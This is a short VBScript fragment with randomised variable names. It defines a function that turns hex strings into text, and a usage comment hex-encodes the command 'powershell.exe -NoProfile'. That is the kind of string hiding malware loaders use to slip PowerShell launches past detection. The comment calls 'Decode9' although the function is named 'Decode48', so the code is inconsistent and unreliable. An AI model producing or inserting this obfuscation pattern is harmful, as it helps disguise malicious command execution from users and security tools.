Function Decode48(h45_apCxawVqc)
    Dim r46_OEBHUbdUDc, i47_CTlFkZiz, l48_xzKsKf
    l48_xzKsKf = Len(h45_apCxawVqc)
    i47_CTlFkZiz = 1
    r46_OEBHUbdUDc = ""
    While i47_CTlFkZiz <= l48_xzKsKf
        r46_OEBHUbdUDc = r46_OEBHUbdUDc & Chr(CLng("&H" & Mid(h45_apCxawVqc, i47_CTlFkZiz, 2)))
        i47_CTlFkZiz = i47_CTlFkZiz + 2
    Wend
    Decode48 = r46_OEBHUbdUDc
End Function

'' Complete script usage:
'' Dim hexPayload
'' hexPayload = "706f7765727368656c6c2e657865202d4e6f50726f66696c65"
'' Dim result
'' result = Decode9(hexPayload)
'' WScript.Echo result
